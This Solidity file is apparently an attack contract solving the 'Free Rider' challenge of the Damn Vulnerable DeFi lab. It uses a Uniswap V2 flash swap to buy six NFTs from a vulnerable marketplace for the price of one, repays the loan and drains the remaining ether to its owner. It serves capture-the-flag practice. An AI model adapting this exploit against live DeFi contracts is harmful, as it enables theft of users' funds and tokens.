// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "hardhat/console.sol";
import "./FreeRiderNFTMarketplace.sol";


interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IUniswapV2Pair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}


contract FreeRiderAttack is Ownable, IUniswapV2Callee, IERC721Receiver{
    using SafeMath for uint;
    IWETH private _weth;
    IERC20 private _token;
    IUniswapV2Pair private _uniswapV2Pair;
    FreeRiderNFTMarketplace private _freeRiderNFTMarketplace;
    address private _buyerAddress;
    constructor(address wethAddress,
            address tokenAddress,
            address payable freeRiderNFTMarketplaceAddress,
            address uniswapV2PairAddress, address buyerAddress) Ownable() {
        _weth = IWETH(wethAddress);
        _token = IERC20(tokenAddress);
        _freeRiderNFTMarketplace = FreeRiderNFTMarketplace(freeRiderNFTMarketplaceAddress);
        _uniswapV2Pair = IUniswapV2Pair(uniswapV2PairAddress);
        _buyerAddress = buyerAddress;
    }

    function start() public payable onlyOwner {
        uint amount = 15 * 10 ** 18;
        (uint amount0Out, uint amount1Out) = address(_weth) < address(_token) ? (amount, uint(0)) : (uint(0), amount);
        _uniswapV2Pair.swap(amount0Out, amount1Out, address(this), abi.encode(amount));
        DamnValuableNFT nft = _freeRiderNFTMarketplace.token();
        uint i = 0;
        for(; i < 6; i++) {
            nft.safeTransferFrom(address(this), _buyerAddress, i, abi.encode("xixi"));
        }

        // drain all token
        console.log(address(this).balance);

        _weth.withdraw(_weth.balanceOf(address(this)));
        console.log(address(this).balance);
        payable(owner()).call{value: address(this).balance}("");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        console.log(address(this).balance);
        uint amount = abi.decode(data, (uint));
        _weth.withdraw(_weth.balanceOf(address(this)));
        console.log(address(this).balance);
        uint[] memory tokenIds = new uint[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        _freeRiderNFTMarketplace.buyMany{value: amount}(tokenIds);
        console.log(address(this).balance);
        _weth.deposit{value: amount.div(1000).mul(3) + amount}();
        // pay back
        _weth.transfer(address(_uniswapV2Pair), amount.div(1000).mul(3) + amount);

    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    override
    returns (bytes4)
    {
        require(_tokenId >= 0 && _tokenId <= 5);

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
